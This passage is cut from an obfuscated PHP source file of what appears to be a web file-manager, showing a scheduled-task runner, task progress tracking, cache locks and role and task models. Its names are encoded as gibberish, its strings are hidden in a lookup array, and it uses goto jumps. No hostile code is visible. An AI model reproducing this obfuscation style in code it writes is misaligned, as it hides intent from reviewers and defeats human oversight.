=> $£ÔéÃÖ[88], $£ÔéÃÖ[1636] => $Ä¬ı‹¡Ï), !1); $Íœî¬ = $Ä¬ı‹¡Ï; } if (!file_exists(USER_SYSTEM . $£ÔéÃÖ[1643])) { self::valueSet(array($£ÔéÃÖ[1635] => $£ÔéÃÖ[197], $£ÔéÃÖ[756] => $£ÔéÃÖ[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $£”šÎã½ =& $_SERVER[Ã¶¡¶„æ]; http_close(); self::valueSet($£”šÎã½[756], $£”šÎã½[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($£”šÎã½[1635] => $£”šÎã½[197], $£”šÎã½[756] => $£”šÎã½[88]), !1); } public static function taskSwitch() { $¶Ù§Ï–£ =& $_SERVER[Ã¶¡¶„æ]; $İµš¤Ï = self::valueGet($¶Ù§Ï–£[756]) == $¶Ù§Ï–£[88] ? $¶Ù§Ï–£[197] : $¶Ù§Ï–£[88]; self::valueSet($¶Ù§Ï–£[756], $İµš¤Ï); } public static function shutdownEvent() { $³€£çœ– =& $_SERVER[Ã¶¡¶„æ]; self::valueSet($³€£çœ–[1635], $³€£çœ–[197]); self::log($³€£çœ–[1644]); } public static function config($õÌèÒÎç, $ŠÅ‘‰å) { self::valueSet($_SERVER[Ã¶¡¶„æ][756], $õÌèÒÎç); } private static function taskRunAll() { $ÎšÎÙ°ú =& $_SERVER[Ã¶¡¶„æ]; $±ÁØ³®‡ = timeFloat(); $Œã‹Éø¯ = Model($ÎšÎÙ°ú[1645])->listData(); $ÇÎ¶ˆ‰² = count($Œã‹Éø¯); for ($²Ûù¡š‘ = 0; $²Ûù¡š‘ < $ÇÎ¶ˆ‰²; $²Ûù¡š‘++) { $É„åä’Ğ = $Œã‹Éø¯[$²Ûù¡š‘]; if (!$É„åä’Ğ[$ÎšÎÙ°ú[399]] || $É„åä’Ğ[$ÎšÎÙ°ú[1646]] != $ÎšÎÙ°ú[88]) { continue; } if (!self::taskTimeCheck($É„åä’Ğ)) { continue; } self::taskRun($É„åä’Ğ); } Hook::trigger($ÎšÎÙ°ú[1647]); self::taskQueueRun($±ÁØ³®‡); } private static function taskQueueRun($ªÔ›«£) { $Œñë¥ÈÊ = 10; while (!0) { $ÇûÏæó‹ = TaskQueue::run(); if ($ÇûÏæó‹ === !1) { break; } if (timeFloat() - $ªÔ›«£ >= $Œñë¥ÈÊ) { break; } } } private static function taskTimeCheck($æğÂò¸ç) { $òô‡åŸø =& $_SERVER[Ã¶¡¶„æ]; $ğº•ğÜ = json_decode($æğÂò¸ç[$òô‡åŸø[203]], !0); $²å‘†ñ = intval($æğÂò¸ç[$òô‡åŸø[1636]]); $ú›ñÌØ = strtotime($òô‡åŸø[1648] . $ğº•ğÜ[$òô‡åŸø[1649]] . $òô‡åŸø[1650]) - strtotime($òô‡åŸø[1651]); $Ú¨ûããŸ = time() - strtotime(date($òô‡åŸø[1652]) . $òô‡åŸø[1653]); $§“æí¶È = $Ú¨ûããŸ >= $ú›ñÌØ && $Ú¨ûããŸ <= $ú›ñÌØ + 3600; switch ($ğº•ğÜ[$òô‡åŸø[33]]) { case $òô‡åŸø[1654]: if (time() - $²å‘†ñ < 3600 * 24 * 30) { return !1; } if ($ğº•ğÜ[$òô‡åŸø[1654]] == date($òô‡åŸø[1655]) && $§“æí¶È) { return !0; } break; case $òô‡åŸø[1656]: if (time() - $²å‘†ñ < 3600 * 24 * 7) { return !1; } $´¿òüøñ = date($òô‡åŸø[1657]) == 0 ? 7 : date($òô‡åŸø[1657]); if ($ğº•ğÜ[$òô‡åŸø[1656]] == $´¿òüøñ && $§“æí¶È) { return !0; } break; case $òô‡åŸø[1649]: if (time() - $²å‘†ñ < 3600 * 24) { return !1; } if ($§“æí¶È) { return !0; } break; case $òô‡åŸø[1658]: if (time() - $²å‘†ñ >= floatval($ğº•ğÜ[$òô‡åŸø[1658]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $™šÑíãÑ =& $_SERVER[Ã¶¡¶„æ]; static $×±Ûòà÷ = 0; $…Ôå¿Ä± = 300; if (!$×±Ûòà÷) { $×±Ûòà÷ = time(); } if (time() - $×±Ûòà÷ < $…Ôå¿Ä±) { return; } $×±Ûòà÷ = time(); $ß¹¢ãû§ = Model($™šÑíãÑ[513])->db($™šÑíãÑ[12]); if ($ß¹¢ãû§) { $ß¹¢ãû§->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($™šÑíãÑ[1659], $™šÑíãÑ[1660]); die; } } public static function taskRun($…œšï¯Ì) { $ğöè¾ =& $_SERVER[Ã¶¡¶„æ]; self::log($ğöè¾[1661] . $…œšï¯Ì[$ğöè¾[399]] . $ğöè¾[1662] . $…œšï¯Ì[$ğöè¾[32]] . $ğöè¾[1663] . $…œšï¯Ì[$ğöè¾[1664]]); Model($ğöè¾[1645])->run($…œšï¯Ì[$ğöè¾[399]]); $ğ«—¯¶Ã = timeFloat(); $Õ¾¾¯ = $ğöè¾[12]; switch ($…œšï¯Ì[$ğöè¾[33]]) { case $ğöè¾[307]: $üÏú¤ = url_request($…œšï¯Ì[$ğöè¾[1664]], $ğöè¾[230], !1, !1, !1, !1, 10); if ($üÏú¤[$ğöè¾[756]]) { $Õ¾¾¯ = strlen($üÏú¤[$ğöè¾[1217]]); } break; case $ğöè¾[229]: $Õ¾¾¯ = Hook::apply($…œšï¯Ì[$ğöè¾[1664]]); default: break; } Model($ğöè¾[1665])->add(array($ğöè¾[1666] => $ğöè¾[12], $ğöè¾[1667] => $ğöè¾[197], $ğöè¾[33] => $ğöè¾[1668] . $…œšï¯Ì[$ğöè¾[399]], $ğöè¾[1669] => json_encode(array($ğöè¾[32] => $…œšï¯Ì[$ğöè¾[32]], $ğöè¾[1670] => timeFloat() - $ğ«—¯¶Ã, $ğöè¾[293] => $Õ¾¾¯)))); $¿Ãˆ² = $Õ¾¾¯ ? $ğöè¾[1671] . $Õ¾¾¯ : $ğöè¾[12]; self::log($ğöè¾[1672] . $…œšï¯Ì[$ğöè¾[399]] . $ğöè¾[164] . $¿Ãˆ²); return !0; } private static function valueGet($ış‘Ì”ƒ) { $öšŸşã =& $_SERVER[Ã¶¡¶„æ]; $äÆ•çœ = $öšŸşã[1673]; $×Æûğ = Model($öšŸşã[435])->get($ış‘Ì”ƒ, $äÆ•çœ); if (is_null($×Æûğ)) { Model($öšŸşã[435])->set($öšŸşã[756], $öšŸşã[88], $äÆ•çœ); Model($öšŸşã[435])->set($öšŸşã[1635], $öšŸşã[197], $äÆ•çœ); $×Æûğ = Model($öšŸşã[435])->get($ış‘Ì”ƒ, $äÆ•çœ); } return $×Æûğ; } private static function valueSet($ÖéÕ¶õÒ, $€­§ÚÎÅ) { $«òˆ¤ùà =& $_SERVER[Ã¶¡¶„æ]; $ÁÔÙé¥å = $«òˆ¤ùà[1674]; CacheLock::lock($ÁÔÙé¥å); $Ñ¾™ªØ = Model($«òˆ¤ùà[435])->set($ÖéÕ¶õÒ, $€­§ÚÎÅ, $«òˆ¤ùà[1673]); CacheLock::unlock($ÁÔÙé¥å); return $Ñ¾™ªØ; } protected static function log($ã´ÁÃöÂ) { write_log($ã´ÁÃöÂ, $_SERVER[Ã¶¡¶„æ][1660]); } private static function cacheClear() { $¤ŸğÂ˜ =& $_SERVER[Ã¶¡¶„æ]; Cache::clearMemory(Model($¤ŸğÂ˜[435])->cacheKey($¤ŸğÂ˜[1673])); Cache::clearMemory(Model($¤ŸğÂ˜[435])->cacheKey($¤ŸğÂ˜[1675])); Model($¤ŸğÂ˜[1645])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\x69\156\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Úıñ£çÎ, $ÇÎ¯²üè = '', $±˜áŸÅ³ = 0, $î»Ş¢†æ = '') { $¼Áè–è• =& $_SERVER[Ã¶¡¶„æ]; if (self::get($Úıñ£çÎ)) { return; } $£ëÏ¼Ôï = defined($¼Áè–è•[475]) ? USER_ID : $¼Áè–è•[197]; $this->task = array($¼Áè–è•[399] => $Úıñ£çÎ, $¼Áè–è•[1676] => $£ëÏ¼Ôï, $¼Áè–è•[1576] => $î»Ş¢†æ, $¼Áè–è•[453] => $¼Áè–è•[12], $¼Áè–è•[33] => $ÇÎ¯²üè, $¼Áè–è•[1078] => $¼Áè–è•[12], $¼Áè–è•[792] => $±˜áŸÅ³, $¼Áè–è•[1677] => 0, $¼Áè–è•[1678] => 0, $¼Áè–è•[1679] => 0, $¼Áè–è•[1680] => timeFloat(), $¼Áè–è•[1681] => 0, $¼Áè–è•[1682] => 0, $¼Áè–è•[1683] => 0, $¼Áè–è•[1684] => 0, $¼Áè–è•[756] => $¼Áè–è•[1635]); $GLOBALS[$¼Áè–è•[1685]] = 1; Hook::bind($¼Áè–è•[1640], array($this, $¼Áè–è•[1686])); Hook::bind($¼Áè–è•[1687], array($this, $¼Áè–è•[1688])); $this->startAfter(); Hook::trigger($¼Áè–è•[1689], $this->task); $this->task[$¼Áè–è•[1682]] = timeFloat(); } public function end($©¶–ñÅ‡ = '') { $¼Õ÷øÆõ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¼Õ÷øÆõ[1682]]) { self::valueSet($this->task[$¼Õ÷øÆõ[399]], !1); } $this->isEnd = !0; if ($©¶–ñÅ‡) { $this->task[$¼Õ÷øÆõ[453]] = $©¶–ñÅ‡; } self::log($¼Õ÷øÆõ[1690] . $this->task[$¼Õ÷øÆõ[399]] . $¼Õ÷øÆõ[1691] . sprintf($¼Õ÷øÆõ[864], timeFloat() - $this->task[$¼Õ÷øÆõ[1680]]) . $¼Õ÷øÆõ[1692]); Hook::unbind($¼Õ÷øÆõ[1640], array($this, $¼Õ÷øÆõ[1686])); Hook::unbind($¼Õ÷øÆõ[1687], array($this, $¼Õ÷øÆõ[1688])); $this->endAfter(); $³ˆªÃç¹ = $this->task; $this->task = !1; Hook::trigger($¼Õ÷øÆõ[1693], $³ˆªÃç¹); } public function update($Óñäó›® = 0, $è¦ô›™† = false) { $öÈ¢‹‚ı =& $_SERVER[Ã¶¡¶„æ]; $Ù¶³Ç•ı =& $this->task; if (!$Ù¶³Ç•ı) { return; } $Ù¶³Ç•ı[$öÈ¢‹‚ı[1677]] += $Óñäó›®; $Ù¶³Ç•ı[$öÈ¢‹‚ı[1681]] = timeFloat(); if ($Ù¶³Ç•ı[$öÈ¢‹‚ı[792]]) { if ($Ù¶³Ç•ı[$öÈ¢‹‚ı[792]] < $Ù¶³Ç•ı[$öÈ¢‹‚ı[1677]]) { $Ù¶³Ç•ı[$öÈ¢‹‚ı[792]] = $Ù¶³Ç•ı[$öÈ¢‹‚ı[1677]]; } $¢Ş¸é  = timeFloat() - $Ù¶³Ç•ı[$öÈ¢‹‚ı[1680]] - $Ù¶³Ç•ı[$öÈ¢‹‚ı[1683]]; if ($¢Ş¸é  <= 0) { $¢Ş¸é  = 0.001; } $Ù¶³Ç•ı[$öÈ¢‹‚ı[1678]] = $Ù¶³Ç•ı[$öÈ¢‹‚ı[1677]] / $Ù¶³Ç•ı[$öÈ¢‹‚ı[792]]; $Ù¶³Ç•ı[$öÈ¢‹‚ı[1679]] = $Ù¶³Ç•ı[$öÈ¢‹‚ı[1677]] / $¢Ş¸é ; if ($Ù¶³Ç•ı[$öÈ¢‹‚ı[1678]] > 0) { $Ù¶³Ç•ı[$öÈ¢‹‚ı[1684]] = $¢Ş¸é  * (1 - $Ù¶³Ç•ı[$öÈ¢‹‚ı[1678]]) / $Ù¶³Ç•ı[$öÈ¢‹‚ı[1678]]; } $Ù¶³Ç•ı[$öÈ¢‹‚ı[1684]] = $Ù¶³Ç•ı[$öÈ¢‹‚ı[1684]] <= 0 ? 0 : $Ù¶³Ç•ı[$öÈ¢‹‚ı[1684]]; } $this->updateAfter(); $ªÚí³î = 0.2; if (timeFloat() - $Ù¶³Ç•ı[$öÈ¢‹‚ı[1682]] < $ªÚí³î && !$è¦ô›™†) { return; } $–µ”„ Û = self::get($Ù¶³Ç•ı[$öÈ¢‹‚ı[399]]); $Ô˜¾Ù„€ = $–µ”„ Û[$öÈ¢‹‚ı[756]]; if ($Ô˜¾Ù„€ == self::STATYS_KILL) { $‘·ğÍ = array($öÈ¢‹‚ı[1694] => LNG($öÈ¢‹‚ı[1695]), $öÈ¢‹‚ı[1227] => !1); Cache::set($öÈ¢‹‚ı[1696] . $this->task[$öÈ¢‹‚ı[399]], $‘·ğÍ, 30); $this->onKill(); $this->end(); die; } else { if ($Ô˜¾Ù„€ == self::STATYS_STOP) { $Ç®áøÄï = 2; $–µ”„ Û[$öÈ¢‹‚ı[1683]] += $Ç®áøÄï; self::valueSet($Ù¶³Ç•ı[$öÈ¢‹‚ı[399]], $–µ”„ Û); sleep($Ç®áøÄï); $this->update(); return; } } $Ù¶³Ç•ı[$öÈ¢‹‚ı[756]] = $Ô˜¾Ù„€ ? $Ô˜¾Ù„€ : $Ù¶³Ç•ı[$öÈ¢‹‚ı[756]]; $Ù¶³Ç•ı[$öÈ¢‹‚ı[1683]] = $–µ”„ Û[$öÈ¢‹‚ı[1683]] ? $–µ”„ Û[$öÈ¢‹‚ı[1683]] : 0; $Ù¶³Ç•ı[$öÈ¢‹‚ı[1682]] = timeFloat(); Hook::trigger($öÈ¢‹‚ı[1697], $Ù¶³Ç•ı); self::valueSet($Ù¶³Ç•ı[$öÈ¢‹‚ı[399]], $Ù¶³Ç•ı); } public function onKillSet($öèÜùÊÇ, $ˆ¾ö«®‰ = array()) { $this->onKillCall = array($öèÜùÊÇ, $ˆ¾ö«®‰); } public function onKill() { $úìõªèü =& $_SERVER[Ã¶¡¶„æ]; self::log($úìõªèü[1690] . $this->task[$úìõªèü[399]] . $úìõªèü[1698]); Hook::trigger($úìõªèü[1699], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¥š¦ı…à) { $²Ö¦ôê =& $_SERVER[Ã¶¡¶„æ]; Cache::set($²Ö¦ôê[1696] . $this->task[$²Ö¦ôê[399]], $¥š¦ı…à, 60); return $¥š¦ı…à; } public static function get($îúƒƒÃİ) { $§ûÃêŸá =& $_SERVER[Ã¶¡¶„æ]; $¾“…š = self::valueGet($îúƒƒÃİ); if (is_array($¾“…š) && $¾“…š[$§ûÃêŸá[1700]]) { $±ºõ‚œ¸ = ActionApply($¾“…š[$§ûÃêŸá[1700]], array($¾“…š)); $¾“…š = is_array($±ºõ‚œ¸) ? $±ºõ‚œ¸ : $¾“…š; } return $¾“…š; } public static function listData() { $ó”«ÛŒÛ = self::valueGet(); return array_sort_by($ó”«ÛŒÛ, $_SERVER[Ã¶¡¶„æ][1680], !0); } public static function kill($À¹Õàî) { return self::changeStatus($À¹Õàî, self::STATYS_KILL); } public static function stop($üİ§Î) { return self::changeStatus($üİ§Î, self::STATYS_STOP); } public static function restart($õ‘çÖÑÒ) { return self::changeStatus($õ‘çÖÑÒ, self::STATYS_RUNNING); } public static function killAll() { $«ÌŸŞß =& $_SERVER[Ã¶¡¶„æ]; $Â€ÖÒ¥¾ = self::listData(); foreach ($Â€ÖÒ¥¾ as $ñ·Ù¬ëÒ) { self::kill($ñ·Ù¬ëÒ[$«ÌŸŞß[399]]); } sleep(2); foreach ($Â€ÖÒ¥¾ as $ñ·Ù¬ëÒ) { self::valueSet($ñ·Ù¬ëÒ[$«ÌŸŞß[399]], !1); } } private static function changeStatus($ñÔª§àÌ, $„¿”¥…) { $ÊÕ¿³¿Š =& $_SERVER[Ã¶¡¶„æ]; $¾…˜Èı = self::valueGet($ñÔª§àÌ); if (!$¾…˜Èı) { return !1; } $¾…˜Èı[$ÊÕ¿³¿Š[756]] = $„¿”¥…; self::valueSet($ñÔª§àÌ, $¾…˜Èı); self::log($ÊÕ¿³¿Š[1701] . $¾…˜Èı[$ÊÕ¿³¿Š[399]] . $ÊÕ¿³¿Š[1702] . $„¿”¥…); return !0; } public static function valueGet($«†Çç‡ü = false) { $Ø³»²úÙ =& $_SERVER[Ã¶¡¶„æ]; $–¿´œŞç = defined($Ø³»²úÙ[475]) ? USER_ID : $Ø³»²úÙ[197]; if ($«†Çç‡ü) { $ğ€Ö–ÛÙ = Model($Ø³»²úÙ[447])->where(array($Ø³»²úÙ[94] => $«†Çç‡ü, $Ø³»²úÙ[33] => $Ø³»²úÙ[1085]))->find(); return $ğ€Ö–ÛÙ ? json_decode($ğ€Ö–ÛÙ[$Ø³»²úÙ[374]], !0) : !1; } return self::taskListUser($–¿´œŞç); } public static function taskListUser($¨á¶èùí = false) { $¿¸úÎ· =& $_SERVER[Ã¶¡¶„æ]; $èğ ©éÊ = array($¿¸úÎ·[33] => $¿¸úÎ·[1085]); if ($¨á¶èùí) { $èğ ©éÊ[$¿¸úÎ·[1676]] = $¨á¶èùí; } $¤İ¢¸À¦ = Model($¿¸úÎ·[447])->where($èğ ©éÊ)->select(); $¤İ¢¸À¦ = $¤İ¢¸À¦ ? $¤İ¢¸À¦ : array(); foreach ($¤İ¢¸À¦ as $¦îÌáÇç => $ª˜‚œ©ä) { $¤İ¢¸À¦[$¦îÌáÇç] = json_decode($ª˜‚œ©ä[$¿¸úÎ·[374]], !0); } return $¤İ¢¸À¦; } public static function valueSet($Ñú™’òĞ, $ø÷€ƒ«½) { $ºÌ „ª =& $_SERVER[Ã¶¡¶„æ]; if (!$ø÷€ƒ«½) { return Model($ºÌ „ª[447])->where(array($ºÌ „ª[94] => $Ñú™’òĞ, $ºÌ „ª[33] => $ºÌ „ª[1085]))->delete(); } $¿ç¹şæÂ = json_encode($ø÷€ƒ«½); if (!$¿ç¹şæÂ) { ob_start(); var_dump($ø÷€ƒ«½); $êäí†å§ = ob_get_clean(); self::log($ºÌ „ª[1703] . json_encode_force($êäí†å§)); } if (!$Ñú™’òĞ || !$ø÷€ƒ«½[$ºÌ „ª[399]]) { return !1; } $èŠ•Ï× = defined($ºÌ „ª[475]) ? USER_ID : $ºÌ „ª[197]; $˜¡‰Ê¥ = array($ºÌ „ª[33] => $ºÌ „ª[1085], $ºÌ „ª[1676] => $èŠ•Ï×, $ºÌ „ª[94] => $Ñú™’òĞ, $ºÌ „ª[374] => $¿ç¹şæÂ); $Ù„ı‘ã‡ = $ºÌ „ª[1704]; CacheLock::lock($Ù„ı‘ã‡); Model($ºÌ „ª[447])->add($˜¡‰Ê¥, array(), !0); CacheLock::unlock($Ù„ı‘ã‡); } public static function log($æ‘şÄŠ) { if (!GLOBAL_DEBUG) { return; } write_log($æ‘şÄŠ, $_SERVER[Ã¶¡¶„æ][1705]); } } goto F¼±ö±±áÏ; aäŠÔİ¯ÖÒ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‰Ì’©ãÌ =& $_SERVER[Ã¶¡¶„æ]; $ÏŒşÛõñ = $GLOBALS[$‰Ì’©ãÌ[6]][$‰Ì’©ãÌ[349]]; self::$cachePath = $ÏŒşÛõñ[$‰Ì’©ãÌ[199]][$‰Ì’©ãÌ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($³Ö²­î’, $õúÈ®óŸ = 0) { $É‰®•­ƒ =& $_SERVER[Ã¶¡¶„æ]; $êËÊĞª = microtime(!0); $å”Øêüï = $êËÊĞª + $õúÈ®óŸ + 0.0001; $‰µ©ê†ô = rtrim(self::$cachePath, $É‰®•­ƒ[8]) . $É‰®•­ƒ[877] . md5($³Ö²­î’) . $É‰®•­ƒ[874]; if (file_exists($‰µ©ê†ô) && filemtime($‰µ©ê†ô) && filemtime($‰µ©ê†ô) < time() - 10) { @unlink($‰µ©ê†ô); } do { if (file_exists($‰µ©ê†ô)) { cacheLockWait(); continue; } $œ‘Œîç = fopen($‰µ©ê†ô, $É‰®•­ƒ[878]); if (!$œ‘Œîç) { return !1; } $ıÉÌ¨µó = flock($œ‘Œîç, LOCK_EX | LOCK_NB); self::$caches[$³Ö²­î’] = array($É‰®•­ƒ[879] => $œ‘Œîç, $É‰®•­ƒ[199] => $‰µ©ê†ô); fwrite($œ‘Œîç, $å”Øêüï); clearstatcache(); if ($œ‘Œîç && $ıÉÌ¨µó) { return !0; } cacheLockWait(); } while (microtime(!0) < $å”Øêüï); $this->unlock($³Ö²­î’); return !1; } public function lockGet($àÚ’·ï) { $‚°¸ÔŸÈ =& $_SERVER[Ã¶¡¶„æ]; $ßÍÍŒåÙ = rtrim(self::$cachePath, $‚°¸ÔŸÈ[8]) . $‚°¸ÔŸÈ[877] . md5($àÚ’·ï) . $‚°¸ÔŸÈ[874]; return file_exists($ßÍÍŒåÙ); } public function unlock($êÁàïø–) { $ĞÒÃ†ŸŠ =& $_SERVER[Ã¶¡¶„æ]; $ªá‘ãÚ½ = self::$caches[$êÁàïø–]; if (!$ªá‘ãÚ½) { return; } @flock($ªá‘ãÚ½[$ĞÒÃ†ŸŠ[879]], LOCK_UN); @fclose($ªá‘ãÚ½[$ĞÒÃ†ŸŠ[879]]); @unlink($ªá‘ãÚ½[$ĞÒÃ†ŸŠ[199]]); unset(self::$caches[$êÁàïø–]); } } class CacheLockRedis { public function lock($¿Â·Äã…, $½ëÖàĞš = 10) { $áöÓ‘ˆÜ = Cache::init(); $æ„º©ÑÛ = microtime(!0) + $½ëÖàĞš; while (microtime(!0) < $æ„º©ÑÛ) { $»°˜­ = $áöÓ‘ˆÜ->get($¿Â·Äã…); if (!$»°˜­) { $”³ª³ = $áöÓ‘ˆÜ->setLock($¿Â·Äã…, $æ„º©ÑÛ, $½ëÖàĞš); if ($”³ª³) { return !0; } } else { if ($»°˜­ < microtime(!0)) { $áöÓ‘ˆÜ->set($¿Â·Äã…, $æ„º©ÑÛ, $½ëÖàĞš * 2); if ($áöÓ‘ˆÜ->get($¿Â·Äã…) === $»°˜­) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Œñ‰ã´¶) { return Cache::init()->get($Œñ‰ã´¶); } public function unlock($ÎÊ—ßæ´) { return Cache::init()->remove($ÎÊ—ßæ´); } } goto b´¥Šñ®á¥; cë§çÌ×µ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x72\x6f\154\145\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x61\165\164\150", "\x6c\x61\142\145\x6c", "\144\x69\x73\160\x6c\x61\171", "\163\x79\x73\x74\x65\x6d", "\x64\145\163\143", "\151\x67\x6e\x6f\162\145\105\x78\x74", "\x69\x67\156\157\x72\145\106\x69\154\145\123\151\x7a\145", "\141\144\155\151\156\x69\163\x74\162\141\164\x6f\x72", "\x73\x6f\162\x74"); public function listData($©À–•¬« = false, $±ÑÂû¶ñ = "\163\157\x72\164", $ÏÇ—Ö¤ = false) { $ø”Ó‰µƒ =& $_SERVER[Ã¶¡¶„æ]; $ÛÓÌüÌè = parent::listData($©À–•¬«, $±ÑÂû¶ñ, $ÏÇ—Ö¤); if (!$©À–•¬«) { foreach ($ÛÓÌüÌè as $šàü˜Ë× => $×è·Æ£) { if ($×è·Æ£[$ø”Ó‰µƒ[2063]] == 1) { $ÛÓÌüÌè[$šàü˜Ë×][$ø”Ó‰µƒ[453]] = LNG($ø”Ó‰µƒ[2297]); } } } return $ÛÓÌüÌè; } public function update($›´âøÂá, $÷´‹¿÷Ÿ) { $Ğ‰£Æ¦ =& $_SERVER[Ã¶¡¶„æ]; $ßË·¯† = parent::listData($›´âøÂá); $ÒØÍ²Ì = $this->findByName($÷´‹¿÷Ÿ[$Ğ‰£Æ¦[32]]); if (!$ßË·¯† || $ÒØÍ²Ì && $ÒØÍ²Ì[$Ğ‰£Æ¦[399]] != $ßË·¯†[$Ğ‰£Æ¦[399]]) { return !1; } if ($ÒØÍ²Ì[$Ğ‰£Æ¦[2063]] == 1) { $÷´‹¿÷Ÿ = array($Ğ‰£Æ¦[32] => $÷´‹¿÷Ÿ[$Ğ‰£Æ¦[32]], $Ğ‰£Æ¦[1888] => $÷´‹¿÷Ÿ[$Ğ‰£Æ¦[1888]]); } $this->filterAuth($÷´‹¿÷Ÿ[$Ğ‰£Æ¦[413]]); return parent::update($›´âøÂá, $÷´‹¿÷Ÿ); } public function remove($¿¨Ë¦€Ú) { $ªœ¦ÀªÔ = parent::listData($¿¨Ë¦€Ú); if (!$ªœ¦ÀªÔ || $ªœ¦ÀªÔ[$_SERVER[Ã¶¡¶„æ][1299]]) { return !1; } return parent::remove($¿¨Ë¦€Ú); } public function add($Çœ”ß) { $İà‘ì¨— =& $_SERVER[Ã¶¡¶„æ]; $‡¡íğê = $Çœ”ß[$İà‘ì¨—[32]]; if ($this->findByName($‡¡íğê)) { return !1; } $èôÊŒ÷Ú = array($İà‘ì¨—[420] => $‡¡íğê, $İà‘ì¨—[1871] => $İà‘ì¨—[12], $İà‘ì¨—[1867] => $İà‘ì¨—[1875], $İà‘ì¨—[2298] => 1, $İà‘ì¨—[1870] => 0, $İà‘ì¨—[2299] => 0, $İà‘ì¨—[1869] => $this->getSort()); $Çœ”ß = array_merge($èôÊŒ÷Ú, $Çœ”ß); $this->filterAuth($Çœ”ß[$İà‘ì¨—[413]]); return parent::insert($Çœ”ß); } private function getSort() { $‘±Ç–ä› =& $_SERVER[Ã¶¡¶„æ]; $Š–Á½Û = parent::listData(); $¦şæœÉ· = array_to_keyvalue($Š–Á½Û, $‘±Ç–ä›[12], $‘±Ç–ä›[1889]); return empty($¦şæœÉ·) ? 0 : max($¦şæœÉ·) + 1; } private function filterAuth(&$—†æöå) { $Å„ ú’ =& $_SERVER[Ã¶¡¶„æ]; $Îä¸Ìã¨ = array(); $ÙË½Íç = array_filter(explode($Å„ ú’[50], $—†æöå)); foreach ($ÙË½Íç as $—†æöå) { $İü¹®Ôä = explode($Å„ ú’[10], $—†æöå); if ($İü¹®Ôä[0] == $Å„ ú’[2300] && $İü¹®Ôä[1] != $Å„ ú’[1205]) { $™İ––‰ˆ = $İü¹®Ôä[0] . $Å„ ú’[10] . $İü¹®Ôä[1] . $Å„ ú’[2301]; if (!in_array($™İ––‰ˆ, $ÙË½Íç)) { $Îä¸Ìã¨[] = $™İ––‰ˆ; } } $Îä¸Ìã¨[] = $—†æöå; } $—†æöå = implode($Å„ ú’[50], $Îä¸Ìã¨); } public function findRoleDefault() { $½ıŸò³™ =& $_SERVER[Ã¶¡¶„æ]; $¨õÄÈúÓ = parent::listData(); $àÊ£Ç´ = !1; foreach ($¨õÄÈúÓ as $×ùµª†Ë) { if (!$×ùµª†Ë || $×ùµª†Ë[$½ıŸò³™[1887]] == $½ıŸò³™[197] || $×ùµª†Ë[$½ıŸò³™[2063]] == 1) { continue; } if (strstr($×ùµª†Ë[$½ıŸò³™[413]], $½ıŸò³™[2302])) { continue; } if (!strstr($×ùµª†Ë[$½ıŸò³™[413]], $½ıŸò³™[2303])) { continue; } if (!$àÊ£Ç´) { $àÊ£Ç´ = $×ùµª†Ë; continue; } $ŠƒàÊÅ° = explode($½ıŸò³™[50], $àÊ£Ç´[$½ıŸò³™[413]]); $ÎŠŠµ¬ = explode($½ıŸò³™[50], $×ùµª†Ë[$½ıŸò³™[413]]); if (count($ŠƒàÊÅ°) > count($ÎŠŠµ¬)) { $àÊ£Ç´ = $×ùµª†Ë; } } return $àÊ£Ç´ ? $àÊ£Ç´[$½ıŸò³™[399]] : $½ıŸò³™[12]; } public function sort($´À³—Ã÷, $®•¸ë‰Ã) { return parent::update($´À³—Ã÷, $®•¸ë‰Ã); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x74\x61\x73\x6b\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\164\x79\160\x65", "\145\166\145\156\164", "\x74\x69\155\x65", "\x64\x65\x73\x63", "\x73\x79\x73\164\x65\x6d", "\145\x6e\141\x62\x6c\x65", "\x6c\x61\x73\164\x52\165\156", "\163\x6f\162\164"); public function listData($ç¬—¡ÓÙ = false, $†¸“š“ö = "\163\157\162\164", $’íñÌá = false) { return parent::listData($ç¬—¡ÓÙ, $†¸“š“ö, $’íñÌá); } public function add($±¯®ş¢) { $ğ–±üã· =& $_SERVER[Ã¶¡¶„æ]; $œÙÚ“” = $this->findByName($±¯®ş¢[$ğ–±üã·[32]]); if ($œÙÚ“”) { return !1; } $±¯®ş¢[$ğ–±üã·[1636]] = 0; $±¯®ş¢[$ğ–±üã·[1889]] = $this->getSort(); return parent::insert($±¯®ş¢); } private function getSort() { $›¬ÉÜÊ„ =& $_SERVER[Ã¶¡¶„æ]; $íÑĞ±°ü = parent::listData(); $±Øä•èó = array_to_keyvalue($íÑĞ±°ü, $›¬ÉÜÊ„[12], $›¬ÉÜÊ„[1889]); return empty($±Øä•èó) ? 0 : max($±Øä•èó) + 1; } public function update($Õ¢ıæŞç, $œÅÎÄœÒ) { $³Ëœãúá =& $_SERVER[Ã¶¡¶„æ]; $²ÓÈîÌ = $this->listData($Õ¢ıæŞç); $şış¥°ì = $this->findByName($œÅÎÄœÒ[$³Ëœãúá[32]]); if (!$²ÓÈîÌ || $şış¥°ì && $şış¥°ì[$³Ëœãúá[399]] != $²ÓÈîÌ[$³Ëœãúá[399]]) { return !1; } return parent::update($Õ¢ıæŞç, $œÅÎÄœÒ); } public function remove($Îƒ‹¬™¥, $ĞòßÁ¯È = false) { 